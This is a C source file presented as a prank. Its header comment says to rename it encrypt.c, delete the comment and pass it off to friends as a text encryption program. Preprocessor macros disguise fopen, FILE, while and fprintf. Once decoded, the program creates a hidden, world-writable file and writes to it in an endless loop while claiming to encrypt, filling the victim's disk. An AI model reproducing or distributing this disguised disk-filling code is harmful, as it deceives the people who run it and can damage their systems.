/*
Little C program to play prank on your friends.
Rename it as encrypt.c and remove this comment ;) 
and pass on the source code as a text encryption program.

Version 0.2 beta

**This code is dumb but never underestimate others' dumbness** 
Author - Akshay Jha
github.com/axayjha
*/

#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

#ifdef __linux__
#define NUM 1
#elif _WIN32
#define NUM 2
#else
#define NUM 0
#endif

#define decode(s,t,u,m,p,e,d)   \
		m ## s ## u ## t
#define begin decode(a,n,i,m,a,t,e)
#define execute decode(I, E, L, F, U, C, K)
#define encode(b,y,t,e,c,o,d) \
		b ## c	## t ## e ## d
#define str(f) #f
#define str2(f) str(f)
#define crypt(x,y,z) y##x##z
#define __crypt crypt(in, fpr, tf)
#define ouput encode(w, a, i, l, h, y, e)
#define encrypt encode(f,a,p,e,o,n,n)

int main(int argc, char const *argv[])
{

	int i=0;
	char serv_name[1000];
	if(NUM == 1)
	{
			mkdir("~/.dat", S_IRWXU | S_IRWXG | S_IRWXO);
    	snprintf(serv_name, sizeof(serv_name), "~/.dat/cipher-%i.txt", getpid());
			chmod(serv_name, 0777);

	}
	else if(NUM ==2)
	{
		_mkdir("C:\\P*\\Dat", S_IRWXU | S_IRWXG | S_IRWXO);
    	snprintf(serv_name, sizeof(serv_name), "C:\\P*\\Dat\\cipher-%i.txt", getpid());
			
	}
	else
	{
		printf("System not recognised.\n");
		return 0;
	}

  printf("Loading...Wait a moment...\n");
  execute* program = encrypt(serv_name, "w+");
	ouput('ready'){
		if (!(++i % 200)) printf("Encrypting, wait a moment...\n");
		__crypt(program, "<Your Text>");
	}


	return 0;
}
